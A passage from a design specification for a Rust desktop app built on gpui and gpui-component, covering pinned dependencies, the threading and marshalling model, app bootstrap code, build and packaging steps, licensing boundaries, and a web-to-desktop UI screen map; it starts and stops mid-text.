# hosts an unrelated/older registry `gpui 0.2.2` and a `gpui-component 0.5.1` that
# depends on it — resolving either would pull a SECOND gpui package id alongside the
# git-pinned gpui above and split every gpui type in the tree (0.5.2 exists only in
# git; it is not published). Never use the registry versions.
gpui-component = { git = "https://github.com/longbridge/gpui-component", rev = "a9a7341c35b62f27ff512371c62419342264710c" }

alacritty_terminal = "0.26"          # UPSTREAM, Apache-2.0 — never Zed's GPL fork (resolves 0.26.0)
portable-pty       = "0.9"           # resolves 0.9.0
vte                = { version = "0.15", features = ["std", "ansi"] }  # resolves 0.15.0; "std" is required for StdSyncHandler (§6.4)
rusqlite           = { version = "0.32", features = ["bundled", "serde_json"] }  # feature set matches §5.1
ureq               = { version = "2", features = ["tls"] }
rustls             = "0.23"
serde              = { version = "1", features = ["derive"] }
serde_json         = "1"
flume              = "0.11"
open               = "5"
tokio              = { version = "1", features = ["rt-multi-thread", "macros", "net", "sync"] }
tokio-tungstenite  = { version = "0.24", features = ["rustls-tls-native-roots"] }
```

> **Resolved (Spike B, 2026-07-02):** at the pinned rev the crate versions are
> `gpui 0.2.2`, `gpui_platform 0.1.0`, `gpui_macros 0.1.0`, and the
> `gpui_platform` features `font-kit`/`x11`/`wayland`/`runtime_shaders` all exist
> as named. The whole tree (gpui-component rev `a9a7341c…` + this zed rev) builds
> and runs on the validated stable toolchain — see §3.7.

### 3.2 Pillar 1 — gpui (Apache-2.0, from Zed)

gpui is a GPU-accelerated, hybrid immediate+retained-mode UI framework. We
consume the core `gpui` crate plus the `gpui_platform` **backend selector**,
which chooses the windowing/GPU backend at compile time per target:

- `gpui_macos` → Metal.
- `gpui_linux` / `gpui_wgpu` → **wgpu** (this is *why Linux is now viable* — the
  old Blade backend was removed in Feb 2026 and replaced with a wgpu path that
  runs on real Vulkan/Mesa).
- `gpui_windows` → compiles, not a v1 gate.

We enable `gpui_platform` features `["font-kit", "wayland", "x11",
"runtime_shaders"]` so a single Linux build serves both Wayland and X11 sessions.

**The model** Fable must internalize:

- One `App` owns **all** application state. There is no other place state lives.
- State is held in `Entity<T>` handles, created with `cx.new(|cx| T::new(...))`.
- You mutate through `entity.update(cx, |state, cx| { ...; cx.notify(); })`.
  `cx.notify()` marks the entity dirty so observers re-render.
- A view is a type that implements `Render` and returns an element tree built
  with the Tailwind-parity `Styled` builder:

  ```rust
  impl Render for IssueRow {
      fn render(&mut self, _w: &mut Window, cx: &mut Context<Self>) -> impl IntoElement {
          div()
              .flex().items_center().gap_2().px_2().h(px(28.))          // compact density
              .bg(cx.theme().background)
              .rounded_md()
              .child(priority_icon(self.priority))
              .child(div().w(px(72.)).text_xs().text_color(cx.theme().muted_foreground).child(self.identifier.clone()))
              .child(div().flex_1().text_sm().child(self.title.clone()))
      }
  }
  ```

  The issue-row grid (`grid-cols-[24px_72px_24px_1fr_auto]` on web) maps to gpui's
  `grid`/`grid_cols` helpers or an explicit flex row with fixed widths — §04
  decides per-widget.

- Layout is **Taffy 0.10.1** (flexbox/grid), driven by the `Styled` refinements.
- Reactivity has two axes: `cx.observe(&entity, ...)` / `cx.notify()` for "state
  changed, re-render," and `cx.subscribe(&entity, ...)` / `cx.emit(Event)` for
  typed events (e.g. "issue row clicked → open detail tab").
- Concurrency is a **foreground + background executor pair**: `cx.foreground_executor()`
  runs `!Send` work on the main thread; `cx.background_executor()` runs `Send`
  work on a thread pool. See §3.5.
- **Globals**: the `Theme` and the sync `Store` are gpui globals
  (`cx.set_global` / `cx.global::<Store>()`), so any view can read them and
  `cx.observe_global::<Store>()` to re-render on sync deltas.

**Fonts**: Inter is embedded via the `AssetSource` (§3.4) and registered at
startup with `cx.text_system().add_fonts(...)` so there is no runtime font path —
critical for AppImage/.app portability.

### 3.3 Pillar 2 — gpui-component (longbridge, Apache-2.0, v0.5.2)

gpui-component gives us ~60 shadcn-parity widgets, a shadcn-token `Theme`, the
`dock` system, and a Tree-sitter `highlighter` (for diff/PR review). Two hard
rules from its own docs (`crates/ui/src/lib.rs`, `crates/ui/src/root.rs`):

1. **`gpui_component::init(cx)` must run first**, before opening any window. It
   binds base keys and installs the component globals.
2. **`Root` must be the first (top-level) view of every window.** `Root` hosts the
   overlay layers — `Dialog`, `Sheet`, `Popover`, `Notification`, `Tooltip`,
   window-level text selection, and the Linux CSD `window_border`. A dialog opened
   in a window whose top view is not `Root` simply will not render.

The **Workspace is a `DockArea`** (from gpui-component's `dock` module):

- **left dock** = the `Sidebar`, constructed with `SidebarCollapsible::None` so it
  is **non-collapsible** (EXP-1 #8);
- **center** = `TabPanel`s holding the issue list / issue detail / diff views;
- **bottom dock** = the multi-tab terminal (§06), a `TabPanel` of terminal panels.

**Every dockable view implements `Panel`, not just `Render`.** gpui-component's
dock does **not** accept an arbitrary `Render` view in a `TabPanel`: it requires
`pub trait Panel: EventEmitter<PanelEvent> + Render + Focusable` with `panel_name()`
and `dump()` (`crates/ui/src/dock/panel.rs`). So the issue list, issue detail, diff
view, and each terminal panel must each impl `gpui_component::dock::Panel` — i.e. be
`Focusable`, emit `PanelEvent`, expose a stable `panel_name()`, and provide a
`dump()`/serialized `PanelState`. Rehydration on launch needs a **panel-name →
constructor registry** because `DockArea::load(state)` reconstructs panels by name.

Each window persists its `DockAreaState` (sizes, which panels are open) so layout
survives restart. **Scope for v1:** persist only the layout (sizes + which panels
are open) and cold-restore panel identity by name; a full `PanelState` round-trip
(restoring each panel's inner state via `dump`/`load`) can be deferred if the
plumbing proves heavy — a coding/terminal panel is not resumed live anyway (§6.13).
Widgets, the `Theme`, and the `highlighter` all come from this
crate; §04 enumerates exactly which component maps to which web element.

### 3.4 Pillars 3 & 4 (interfaces only — owned elsewhere)

**Pillar 3 — terminal (§06).** `alacritty_terminal` **0.26 upstream**
(Apache-2.0) — we use only `Term`/`Grid`/the parser, **never** its `tty` or
`event_loop` modules — paired with `portable-pty 0.9` and `vte 0.15` (`ansi`
feature). **We own the PTY master.** The read loop is the software tee that feeds
both the emulator and the steer publisher. This section only fixes the crate
choices and the licensing boundary (§3.8); the emulator/element/keys details are
§06's.

**Pillar 4 — sync (§05).** From-scratch Electric client on `ureq` (blocking HTTP +
`rustls`) and `rusqlite` (WAL). One `std::thread` per shape. This section fixes
the threading contract (§3.5); the protocol/store/manager internals and every
EXP-1 #13 gotcha are §05's.

### 3.5 Threading model

The single invariant that governs everything: **gpui `Entity`, `Context`,
`Window`, and views are `!Send`.** They live on and never leave the foreground
(main) thread. All UI mutation happens on the foreground executor. The background
does three kinds of blocking work, and every result marshals back to the
foreground before touching an `Entity`.

**Foreground (main thread).** All rendering, all `entity.update`, all
`cx.notify`. UI-driven async (awaiting a tRPC mutation, then updating a
collection) runs via `cx.spawn(async move |cx| { ... })` (async-closure form at the
pinned rev — `cx` is a `&mut AsyncApp` passed by ref), which schedules onto the
foreground executor and can hold `WeakEntity` handles across `.await` points.

**Background thread class (a) — Electric long-poll workers.** One dedicated
`std::thread` per shape: **14 threads per signed-in account.** Each runs a
blocking `ureq` long-poll (`live=true`, ~90 s hold) against its shape proxy,
decodes the delta off-thread, **applies the whole batch to SQLite under the
writer mutex** (one `BEGIN IMMEDIATE…COMMIT` per poll response, HTTP outside the
lock — see §05), then emits only the lightweight applied keys over a `flume`
(or `crossbeam`) channel. The SQLite write happens **here, on the shape thread**,
never on the foreground (§3.5 marshalling, and §5.8, which is authoritative for
this split). This mirrors the proven Swift-`Task`-per-shape and
Zig-thread-per-shape models and sidesteps the friction of running a tokio reactor
underneath gpui's own executors. 14 mostly-parked blocking threads are cheap.
Details, backoff, and 401/409 handling: §05.

**Background thread class (b) — PTY read threads.** One blocking-read thread per
open terminal. Each read does the **software fan-out**: bytes → the alacritty
emulator *and* → the steer publisher, then wakes the UI. This is `read_loop.rs`,
the steer tee (§06/§08).

**Background thread class (c) — `child.wait()` threads.** One per spawned child
process (the `claude` session, each run-config launch) so process exit is
observed without polling; exit ends the `coding_sessions` row (§07) and flips the
run tab's play/stop state.

**Marshalling rule (absolute).** Never move an `Entity`, `Context`, or `Window`
into a background closure. Two sanctioned ways back to the foreground:

1. `WeakEntity::update(&mut cx, |state, cx| { ... })` from inside a foreground
   `cx.spawn`, upgrading the weak handle (it may be gone if the window closed).
2. Push a plain-data message (decoded rows, a PTY byte chunk, an exit code) over a
   `flume` channel, drained by **one** foreground `cx.spawn` task per subsystem
   that applies it to the right `Entity` and calls a **fine-grained** `cx.notify`.

```rust
// app/src/sync_bridge.rs — the single drain task (foreground)
// NB: gpui at the pinned rev takes ASYNC CLOSURES (App::spawn / Context::spawn are
// AsyncFnOnce; `cx` is a `&mut AsyncApp` passed by ref). Use `async move |cx| {…}` —
// do NOT use the old `|cx| async move {}` form, and pass `cx` (not `&mut cx`) to update().
let (tx, rx) = flume::unbounded::<ShapeDelta>();     // tx cloned into each shape thread
cx.spawn(async move |cx| {
    while let Ok(delta) = rx.recv_async().await {
        store_entity.update(cx, |store, cx| {
            store.rehydrate(&delta);   // re-hydrate touched rows from the read-only connection
                                       // (the SQLite write already happened on the shape thread, §5.8)
            cx.notify();               // only THIS collection's observers rerun
        })?;
    }
    anyhow::Ok(())
}).detach();
```

The drain **does not write SQLite.** The shape thread committed the batch off-thread
(class-(a) above) and sent `ShapeDelta { account_id, shape, applied_keys }`; the
foreground drain does cheap read-only point-reads (`rehydrate`) from the read-only
WAL connection to refresh the in-memory collection, then `cx.notify()`. This keeps
every shape's batch write off the render thread — serializing writes onto the
foreground would jank rendering under sync load and re-create the write-contention
§05 was designed to kill. §5.8 is the authoritative spec for this split; §3.5 mirrors it.

**Per-shape collection Entities.** The `Store` exposes one reactive `Entity` per
shape (issues, notifications, projects, …) rather than one god-entity. A
notification arriving does **not** invalidate the issue list — only the
notifications collection's observers re-render. This keeps the board smooth while
the inbox churns. `Store` and `Theme` are gpui **globals**; views `cx.observe`
the specific collections they read.

### 3.6 App shell & bootstrap

`app/src/main.rs` composes the pillars. The entrypoint at the pinned rev is
**`gpui_platform::application()`** — the cross-platform backend-selecting
constructor used by every buildable gpui-component example (verified by Spike B
against the rev: `gpui::Application::new()` does **not** exist there; the only
`Application` constructors are `Application::with_platform(…)` and
`new_inaccessible`, and `gpui_platform::application()` wraps `with_platform`
with the compile-time platform pick). `on_open_urls` — the macOS OAuth-callback
hook for the §5.7 `exp://` deep link — has the real signature
`FnMut(Vec<String>)` with **no `cx` argument**, so the handler must marshal the
URLs into the App via a channel (flume/mpsc) drained by a foreground task, or
stash pending URLs for `run()` to pick up (Zed's own pattern). The shape is:

```rust
fn main() {
    let app = gpui_platform::application()           // the real entrypoint — NOT gpui::Application::new()
        .with_assets(assets::Assets);                // embedded Inter + Lucide (§3.4)
    // on_open_urls is the macOS OAuth callback surface (exp:// → §5.7).
    // Real signature: FnMut(Vec<String>) — NO cx. Marshal into the App via a channel.
    let (url_tx, url_rx) = flume::unbounded::<Vec<String>>();
    app.on_open_urls(move |urls| { let _ = url_tx.send(urls); });
    app.run(|cx| {
            gpui_component::init(cx);                // MUST be first — installs component globals
            // ORDER IS LOAD-BEARING. Theme::change → apply_config reassigns BOTH theme.colors
            // AND theme.tokens from the stock dark ThemeConfig, so it clobbers any palette set
            // before it. Force dark FIRST, THEN overwrite colors + rebuild tokens.
            theme::Theme::change(theme::ThemeMode::Dark, None, cx); // FORCE dark (stock palette)
            theme::apply_exponential_dark(cx);       // sets theme.colors from generated Srgb8 AND rebuilds theme.tokens
            // NB: never call sync_system_appearance — the app is dark-only, like web.

            actions::bind_global_keymap(cx);         // actions! + KeyBinding::new (Zed keymap-predicate style)
            #[cfg(target_os = "macos")]
            menus::install_menubar(cx);              // cx.set_menus(...)

            let store = sync::Store::open(cx);       // rusqlite/WAL, spawns the 14 shape threads
            cx.set_global(store);

            // Foreground drain for the OAuth-callback URLs (on_open_urls has no cx).
            cx.spawn(async move |cx| {
                while let Ok(urls) = url_rx.recv_async().await {
                    auth::handle_oauth_callback(urls, cx);
                }
            }).detach();

            open_main_window(cx);
        });
}

fn open_main_window(cx: &mut App) {
    let bounds = Bounds::centered(None, size(px(1280.), px(820.)), cx);
    // The gpui-component-sanctioned pattern opens windows inside a foreground spawn
    // (hello_world main.rs:28, story lib.rs:111). A direct cx.open_window call may
    // work (Zed does it), but follow the examples.
    cx.spawn(async move |cx| {
        cx.open_window(WindowOptions { window_bounds: Some(WindowBounds::Windowed(bounds)), ..Default::default() },
            |window, cx| {
                let workspace = cx.new(|cx| ui::Workspace::new(window, cx)); // the DockArea
                cx.new(|cx| gpui_component::Root::new(workspace, window, cx)) // Root wraps it (takes impl Into<AnyView> — no .into() needed)
            })
    }).detach();
}
```

**Forced dark theme.** We apply the Exponential Dark palette and call
`Theme::change(Dark)` and **never** wire `sync_system_appearance` — the product is
dark-only, exactly like web (`html.dark`). §04 owns the palette mapping.

**Actions & keymap.** Commands are `gpui` actions (`actions!(exp, [OpenSearch,
NewIssue, ToggleTerminal, ...])` or `#[derive(Action)]`), scoped to a view with
`.key_context("Workspace")`, and bound with `KeyBinding::new("cmd-k", OpenSearch,
Some("Workspace"))` in the Zed keymap-predicate style. The macOS menubar is built
with `cx.set_menus(vec![Menu { ... }])`.

**Multi-window.** `open_main_window` is callable N times; every window gets its
own `Root` + `Workspace`/`DockArea` but they all read the **same global `Store`**
and `Theme` — so two windows show the same live data and a coding session can run
in each (§07 concurrent sessions). Window close drops that window's entities; the
`WeakEntity::update` upgrade in the drain task fails cleanly for closed windows.

### 3.7 Build, toolchain & packaging

**Toolchain.** `rust-toolchain.toml` pins `channel = "1.96.0"` — **resolved by
Spike B (2026-07-02)**, which built and ran the whole pinned tree under rustc
1.96.0 stable on aarch64-apple-darwin. The floor is 1.95.0 (Zed's own
`rust-toolchain.toml` pin at the rev); gpui-component declares no MSRV but its
edition 2024 requires ≥1.85. Pinning is required because the gpui git rev tracks
a specific compiler surface.

**`.cargo/config.toml`** carries per-target link flags and the **dev opt-level
overrides** — the heavy layout/render/text crates must be compiled at
`opt-level = 3` even in dev profile or layout is painfully slow. Adopt
gpui-component's own full `[profile.dev.package]` list (its workspace does
exactly this):

```toml
# apps/desktop/.cargo/config.toml
[target.aarch64-apple-darwin]
rustflags = ["-C", "link-arg=-mmacosx-version-min=13.0"]

# apps/desktop/Cargo.toml — gpui-component's full dev opt-level list
[profile.dev.package]
gpui          = { opt-level = 3 }
gpui_platform = { opt-level = 3 }
gpui_macros   = { opt-level = 3 }
taffy         = { opt-level = 3 }
resvg         = { opt-level = 3 }
rustybuzz     = { opt-level = 3 }
ttf-parser    = { opt-level = 3 }
smol          = { opt-level = 3 }
tree-sitter   = { opt-level = 3 }
ropey         = { opt-level = 3 }
sum_tree      = { opt-level = 3 }
```

**Build-time reality check (Spike B):** a genuinely cold build of the full
pinned tree (496 crates, gpui 0.2.2 + gpui-component) took **≈1m43s** on the M4
Pro dev machine — local dev iteration is not a bottleneck. CI will be slower
(budget ~10–20 min on GitHub macOS runners), but nothing like the old
tens-of-minutes fear.

**Host build deps.**

- **macOS**: Xcode Command Line Tools (Metal toolchain, `metal`/`metallib`),
  codesign/notarytool for release.
- **Linux**: Wayland + X11 client libs, `libxkbcommon`, the Vulkan loader + Mesa
  (wgpu needs a real GPU driver), `fontconfig`/`freetype`, `openssl`, and a
  working PTY (`/dev/ptmx`). Dev on a **real-GPU** box — llvmpipe/software Vulkan
  (the old UTM/VM path) is not a valid target for wgpu.

**Assets are embedded.** Inter TTF, the Lucide icon set, and the packaging
templates ship inside the binary via `AssetSource`, so there are **no runtime
asset paths** to break inside an `.app` or an AppImage.

**No turnkey bundler — packaging is DIY (release-time, manual):**

- **macOS**: build the `aarch64-apple-darwin` binary, assemble an arm64 `.app`
  bundle with a hand-written `Info.plist`, then `codesign` (Developer ID,
  hardened runtime) and `xcrun notarytool submit`. arm64-only for v1.
- **Linux**: bundle the `x86_64` binary + embedded fonts into an **AppImage** (and
  optionally a `.deb`), carrying the wgpu/Vulkan-loader/Mesa/`fontconfig` runtime
  deps. Ship both because distro coverage varies.

**Explicitly out of v1 scope:** gpui has **no system tray** and **no
auto-update** — both would be DIY and are deferred.

**CI** (`.github/workflows/build-desktop.yml`, added in Phase 0): triggers on
`desktop-v*` tags, builds `macos-14` (arm64) + `ubuntu` (x86_64), uploads
**unsigned** artifacts, and runs the **generator-drift guard** (re-run the
`domain-contract` + `design-tokens` Rust emitters and `git diff --exit-code` the
committed `*.generated.rs` files). Signing/notarization stay manual per the
release checklist.

### 3.8 Licensing boundary (LD-6, recap)

Every crate we *depend on* is Apache/MIT: `gpui` (Apache-2.0), `gpui-component`
(Apache-2.0), `alacritty_terminal` **upstream** (Apache-2.0), `portable-pty`,
`vte`, `rusqlite`, `ureq`, `rustls`, `tokio-tungstenite`. **Zed's own
`crates/terminal` and `crates/terminal_view` are GPL-3.0-or-later** — we may
*study* them to learn the alacritty↔gpui integration but must **never copy their
code** into our (non-GPL) app. Reimplement clean.

The highest copy-temptation surfaces are the terminal key encoder and the grid
painter. Fable keeps an explicit provenance note at the top of
`terminal/keys.rs` and `terminal/element.rs` (specifically the `layout_grid` and
`convert_color` helpers) stating the code is an independent reimplementation from
the VT/xterm specs and the alacritty upstream API, not derived from Zed's GPL
sources. §06 carries the same note.

### 3.9 Gotchas (must-handle, day one)

- **Never mount a zero-size surface.** wgpu and Metal panic or black-screen on a
  0-width/0-height surface. Guard the docked terminal and the diff view against a
  0-height parent during rapid resize (clamp to ≥1px or skip paint when
  `bounds.size` is degenerate).
- **Duplicate per-frame element IDs silently drop nodes in release.** Every
  repeated child in a list/loop must get a stable `.id(...)`; prefer
  `uniform_list` / gpui-component `List`/`virtual_list` for the issue list and
  terminal grid rows so IDs are managed for you.
- **The pinned rev's own examples are the source of truth for the bootstrap API.**
  The entrypoint is `gpui_platform::application().with_assets(…).run(…)`
  (confirmed at the pinned rev by Spike B — `gpui::Application::new()` does not
  exist there; `on_open_urls` is the macOS OAuth-callback hook and takes
  `FnMut(Vec<String>)`, no `cx`), but the exact `WindowOptions`/`Bounds`
  constructors can still differ from any blog/example you remember — confirm the
  window/options surface against the rev's `examples/` before writing the final
  `main.rs`. For headless/CI smoke tests, `gpui_platform::headless()` exists at
  the pinned rev.

### 3.10 Phase-1 gate

The window opens rendering the **Exponential Dark** theme; a **non-collapsible**
`Sidebar` (left dock), an empty center `TabPanel` area, and an empty bottom
terminal dock all render at compact density; a **second window opens sharing the
global `Store`**; and rapid window resize causes **no zero-size panics**. Meeting
this gate proves the four-pillar composition (gpui + gpui-component + the shell +
the global-Store wiring) before §05's sync engine and §06's terminal land on top.


---

## 4. UI parity + theming (web → gpui-component, compact density, hard interactions, EXP-1 chrome)

This is the section that makes the desktop app *feel like Exponential*. The mandate is not "a native app inspired by the web" — it is a **one-to-one copy of the web experience**, pixel-parity shadcn look, every screen and interaction present, plus IDE surfaces the web does not have (owned by §06/§07/§08). Everything in the `ui` crate mirrors a concrete web route or component under `apps/web/src/`; if you cannot point at the web original, you are inventing, and inventing is out of scope. The parity target is the running web app at compact density — build side-by-side and diff.

This section owns: the read/mutation model every view sits on, the screen→component map, the theme (programmatic ThemeColor from generated tokens), compact density, the three hard build-it-ourselves interactions (markdown editor, autocomplete overlay, virtualized list with inline dropdowns), the verbatim-port contracts (`filters.ts`, `domain.ts`), the EXP-1 chrome punch-list, and the explicit UI non-goals. It defers: the sync collections themselves to §05, the terminal/run-bar rendering to §06/§07, the steer viewer UI to §08, auth/token/onboarding-doctor mechanics to §07 (this section only places their *screens*).

### 4.1 The read/mutation model every view sits on

Before any screen, lock the data pattern. It is the gpui analog of the web's `useLiveQuery` + tRPC mutation split, and every view obeys it without exception.

**Reads are reactive queries over the §05 collections.** §05 exposes a global `Store` (a gpui `Global`) holding one `Entity<Collection<T>>` per synced shape (workspaces, projects, issues, labels, issue_labels, users, workspace_members, workspace_invites, comments, attachments, notifications, issue_events, issue_subscribers, coding_sessions). A view never reads Postgres, never calls tRPC to *fetch*, never holds its own copy of a row. It:

1. In `Render`, pulls the collections it needs from the global (`Store::global(cx)`), runs an in-memory filter/sort (the query), and builds elements from the result.
2. In its constructor, `cx.observe(&store_entity, |this, _, cx| cx.notify())` on each collection it depends on, so an Electric echo re-renders it automatically. This is the whole reactivity story — observe/notify, exactly like the web's live query re-runs on collection change.

Queries are plain Rust over `Vec<T>` / index maps — there is no query engine. The board query is `issues.iter().filter(|i| i.project_id == pid && matches_filters(i, label_ids_of(i), &filters)).collect()` then grouped by status and sorted by `sort_order`. Keep query helpers in `ui/src/queries.rs` (one function per web hook: `project_board(cx, project_id, filters)`, `my_issues(cx, user_id)`, `inbox(cx, user_id)`, `issue_detail(cx, identifier)`), mirroring `apps/web/src/hooks/use-project-board-data.ts`, `use-my-issues-data.ts`, etc. Do not scatter filtering logic into views.

**Mutations are tRPC-only, via the `api` crate.** No view ever writes a collection directly. A status dropdown change calls `api.issues_update(IssuesUpdateInput { id, status: Some(new) })` (the desktop mirror of `trpc.issues.update`); the write lands in Postgres, Electric streams it back, §05 applies it to the `issues` collection, the observe fires, the row re-renders with the new status. The UI shows the change only after the echo — the same optimistic-vs-confirmed decision the web makes.

**The `awaitTxId` gate (optional, per-call).** §05's mutation client can capture the Postgres `txid` returned by the tRPC procedure (the web's `generateTxId` contract) and expose `api.issues_update(...).await_synced(cx)` which resolves once the §05 sync manager has observed that txid land in the relevant shape. Use the gated form where the UI must not advance until the write is visible (e.g. create-issue dialog closing and navigating to the new issue; completing a recurring issue that spawns a successor). Use the un-gated fire-and-forget form for high-frequency inline edits (status/priority dropdowns) where the observe-driven re-render is enough and a spinner would be noise. **Decision:** default to un-gated for inline field edits, gated for create/delete/navigate flows.

**`is_ready` drives skeleton-vs-empty.** §05 exposes, per shape, a first-snapshot-complete flag (the shape has caught up to its initial `up-to-date` control message). A view computes `is_ready = store.issues.is_ready() && store.projects.is_ready()` for the shapes it needs. While `!is_ready`, render `Skeleton` placeholders (gpui-component `skeleton.rs`). Once ready and the query is empty, render the real empty-state (the web's "No issues" copy). **This distinction is load-bearing** — EXP-1 #13 was fundamentally "empty snapshot rendered as if it were the real empty state." Never render an empty list as "no data"; render it as "still syncing" until `is_ready`. §05 owns the flag; this section owns honoring it everywhere.

### 4.2 Screen → gpui-component map

Every screen below maps to a web route/component and a set of gpui-component widgets (all confirmed present in `crates/ui/src/`, all Apache-2.0). Component crate is imported as `gpui_component`. Overlays (dialogs, sheets, notifications) are hosted by the mandatory `Root` wrapper (`gpui_component::Root`) at the top of the window tree — §03's shell installs it; this section's dialogs/sheets push into it via `cx.open_dialog` / the `sheet` API. **Rule:** slide-ins use `Sheet` (`sheet.rs`); modals use `Dialog`/`AlertDialog` (`dialog/`). Desktop always renders the non-mobile branch — there is no mobile topbar and no Sheet-as-mobile-fallback (see §4.9).

**Auth** (`apps/web/src/routes/auth/login.tsx`, `register.tsx`). A centered `Card` (`group_box.rs`/card styling) with `Input` (email/password) + primary `Button`. Above the form, a **native instance/server picker** the web does not need: a `Select` or small `DropdownMenu` choosing Exponential Cloud (`app.exponential.at`) vs. a self-hosted base URL (free-text `Input`, persisted to the token store). Below, an `OAuthProviderButtons` row (Google, plus any configured OIDC providers fetched from `/api/auth-config`), each a `Button` with a leading `Icon`. The cloud/Google button appears **first** (EXP-5: Linux login was missing the cloud button and put Google below). OAuth open goes through the `api` crate's `opener` chain (§07) — never a raw `xdg-open` that can land in a text editor (EXP-5). Auth mechanics (Better Auth session, token store) are §07; this section places the screen and wires the buttons.

**Onboarding** (`apps/web/src/routes/_authenticated/onboarding.tsx` + `components/onboarding/`). A `Stepper` (`stepper/`) inside a `Card`: step 1 = create project (`Input` name + a **ColorSwatchGrid** — a fixed grid of `Button`s bound to the project color palette, mirroring the web swatch picker), step 2 = connect GitHub repo (`GithubRepoPicker`, see Settings). The desktop adds a **tooling doctor** step (verify `claude` CLI + `git` on PATH, §07) and the **hidden auto-minted API key** (§07/EXP-2a) — no manual key field ever. Web's "create your first issue" step is dropped in favor of project + GitHub connect (EXP-2g; already the web posture).

**Workspace shell** (`apps/web/src/components/workspace/` sidebar + `routes/w/$workspaceSlug/route.tsx`). §03 builds the `DockArea`; this section fills the left dock with `Sidebar` configured `SidebarCollapsible::None` (EXP-1 #8 — **not collapsible**; the enum value literally exists for this). Sidebar contents top-to-bottom: workspace-picker `DropdownMenu` (EXP-1 #1 — a shadcn dropdown, not a native/ugly menu), then first-class nav rows **My Issues**, **Inbox**, **Search** (EXP-1 #3 — these were missing on native), then a `SidebarGroup` "Projects" with a **`+` new-project button on the group header** (EXP-1 #2 — the `+` belongs here, not next to the workspace picker), then a footer with a **Feedback** direct item (EXP-1 #10) and an **account/settings `DropdownMenu`** (EXP-1 #11 — Settings lives in this bottom dropdown, not only a system menubar). See §4.8 for the full chrome punch-list and the solo-vs-team visibility rule.

**Accept-invite surface** (`apps/web/src/routes/invite/$token.tsx`). A native desktop app cannot receive an `https://app.exponential.at/invite/<token>` browser click, so a desktop-only invitee otherwise has no way to join. Provide **two** paths: (1) register an **`exp://invite/<token>` deep link** (paired with the OAuth `exp://` scheme work, §5.7 / §7) that opens the accept card directly; and (2) a fallback **"Join a workspace"** screen (reachable from the account/settings menu) where the user pastes an invite link or token. Both call `api.workspace_invites_get_by_token` to **preview** the invite (workspace name + role + expiry/used state — mirror the web card, handling expired / already-used / not-signed-in states), then `api.workspace_invites_accept` and navigate to the joined workspace. "Sign in to accept" when unauthenticated.

**Project board** (`apps/web/src/components/issue-list.tsx`, `issue-filter-bar.tsx`, `issue-filter-popover.tsx`, `active-filter-pills.tsx`, `issue-search-sheet.tsx`; route `routes/w/$workspaceSlug/projects/$projectSlug/index.tsx`). The center `TabPanel`. Top: an `IssueFilterBar` = `Tabs` (All / Active / Backlog, styled exactly like web — EXP-1 #4/#12) + a filter `Button` opening `IssueFilterPopover` (a `Popover` hosting a `Command`/searchable list for status/priority/label drill-down), with `ActiveFilterPills` (`Tag` chips with an ✕) below. Body: the virtualized issue list (§4.6) — a `List` with a custom `ListDelegate` rendering rows in a grid, `Collapsible` status-group headers (empty groups hidden, per web), inline `PriorityDropdown`/`StatusDropdown` (icon `menu`/`DropdownMenu`), `AssigneeDropdown` (`Combobox` + `Avatar`), `DueDateDropdown` (`Popover` + `Calendar`), and a right-click `ContextMenu` (`menu/`, mirroring `issue-row-menu/context-menu.tsx`: top items **Open issue**, **Mark as done / Move to todo**, **Copy issue ID**, then submenus for status/priority/assignee/labels, **Mark as duplicate… / Unmark duplicate** (opens the §4.6 `IssuePicker`), copy-link, and delete). `IssueSearchSheet` is a `Dialog` (⌘K quick-open by title/identifier). The **list background color must match web** (EXP-1 #4 called out the wrong bg) — comes from the real theme surfaces `list`/`list_head` (with `secondary`/`background` as fallbacks), §4.3 — **not** a `card` token (no such field exists).

**My Issues** (`routes/w/$workspaceSlug/my-issues/`) and **Inbox** (`routes/.../inbox/`, `components/inbox/`). My Issues reuses the board list keyed by `assignee_id == me`. Inbox has a **two-button segmented control** (there is no dedicated segmented widget — build it from `Button` + selected state) with count suffixes: **"For me · N"** and **"Needs your review · N"**. The two tabs are modeled **differently** (mirror `components/inbox/inbox-view.tsx`, do not build both as a flat notifications list):
- **"For me"** = notifications **grouped by issue** — one card per issue with an unread dot + left-border accent, up to **3 sub-rows** (type icon + title from `domain`, §4.7) then "+N more", a relative time, and **click marks the whole group read** (`api.notifications_mark_read` over the group; header **"Mark all read"** → `api.notifications_mark_all_read`).
- **"Needs your review"** = **NOT a notifications feed** — a query over the synced **`issues`** collection filtered to `pr_state == 'open'` scoped to the current workspace, rendered as issue cards with a **"PR" badge** (independent of notifications).

**Issue detail** (`apps/web/src/components/issue-detail-view.tsx`, `issue-timeline.tsx`, `issue-editor/`, `issue-properties/`, `comment-rows/`; route `.../issues/$issueIdentifier`). A detail **header** carries the identifier, a **Start coding** affordance (§7.1 — enabled iff `repositories.forIssue` is non-null AND the tooling doctor is green; this is the desktop's analog of web's "Start on my desktop" remote-start button, but launches **locally**), and a **`…` actions `DropdownMenu`** with **Mark as duplicate… / Unmark duplicate** (mirrors `issue-detail-view.tsx` L361-398 — opens the shared `IssuePicker` overlay from §4.6 to choose the canonical issue, then `api.issues_update({ duplicate_of_id })`; the server atomically sets `status='duplicate'`, and clearing restores the prior status). Two-pane body inside the center panel: **left** = title `Input` (borderless, large) + the **markdown editor** (§4.5) for `description` + an attachment rail (image thumbnails from the `attachments` collection) + the **timeline** — `issue_events` and `comments` **interleaved and sorted by `created_at`** (`Avatar` + relative `time/`), each comment carrying inline **Edit + Delete** affordances **gated to author-or-admin** (`api.comments_update` / `api.comments_delete`) — + a **mention-capable comment composer** (the lightweight `@`-autocomplete textarea from §4.6, **not** the heavy block editor: comments have no toolbar and no image-upload path on web; **Cmd/Ctrl+Enter submits** `api.comments_create`) + the **steer presence banner** (a "coding now" `Badge` + Watch button when a `coding_sessions` row is `running` for this issue — the viewer UI is §08) + a **duplicate banner** (`Alert` linking `duplicate_of_id` when status is `duplicate`). **Right** = a properties panel: status/priority/assignee/labels/due-date/project + a **recurrence control**, each an inline dropdown identical to the board's. The **recurrence control** is a `Repeat`-icon `Popover` hosting the `RecurrenceEditor` (below); changing it calls `api.issues_update({ recurrence_interval, recurrence_unit, due_date: first_due })` and a "Stop recurring" action clears both to null (mirror `issue-properties-panel.tsx` `RecurrenceControl` + `handleRecurrenceChange`). The **due-date control** is a `Popover` + `Calendar` that, once a date is set, also shows **start-time + end-time `TimeInput`s and an "All day" clear** (mirror `DueDateControl`): edits carry `due_time`/`end_time` through `api.issues_update` with **cascade-null** rules — clearing the date nulls `due_time`+`end_time`; clearing `due_time` nulls `end_time`. All property edits go through `api.issues_update` / `api.issue_labels_add` / `api.issue_labels_remove`. `completed_at` is 